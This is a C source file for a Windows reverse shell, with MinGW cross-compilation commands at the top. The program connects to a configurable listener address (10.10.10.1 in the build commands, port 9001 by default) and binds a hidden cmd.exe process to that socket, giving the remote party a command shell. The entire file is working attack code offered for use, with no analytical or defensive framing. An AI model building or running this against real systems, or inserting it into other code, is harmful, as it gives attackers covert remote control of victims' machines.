/*
DESCRIPTION
Simple reverse shell for windows

COMPILATION
x86_64-w64-mingw32-g++ -static -o revIp simpleRevShellWinIP.c -lws2_32 -DLHOST='"10.10.10.1"'
i686-w64-mingw32-g++ -static -o revIp32 simpleRevShellWinIP.c -lws2_32 -DLHOST='"10.10.10.1"'

AUTHOR
DannyDB
*/

#include <winsock2.h>
#include <io.h>
#include <stdio.h>
#include <string.h>


#ifndef LHOST
#define LHOST "127.0.0.1"  //Default IP
#endif

#ifndef LPORT
#define LPORT 9001  //Default port
#endif

int main(int argc, char *argv[]){

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2 ,2), &wsaData);

	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(LPORT);
	sa.sin_addr.s_addr = inet_addr(LHOST);

	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        printf("\n [!] ERROR: failed to connect\n");
		return (1);
	}

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
